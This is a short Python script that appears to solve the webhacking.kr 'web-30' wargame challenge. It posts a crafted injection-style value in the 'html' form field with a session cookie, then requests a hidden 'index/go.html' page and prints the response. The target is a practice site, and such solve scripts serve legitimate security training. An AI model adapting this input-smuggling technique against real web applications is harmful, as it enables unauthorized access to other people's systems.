import requests

PHPSESSID = ''
PROBLEM_URL = 'http://webhacking.kr/challenge/web/web-30/index.php'
cookies = {
    'PHPSESSID' : PHPSESSID
}


r = requests.post(PROBLEM_URL, cookies = cookies, data = {
    'html' : "'&l's"
})

if r.text:
    print(r.text)
    r = requests.get(PROBLEM_URL.replace('index.php','') + 'index/go.html',cookies = cookies)
    print(r.text)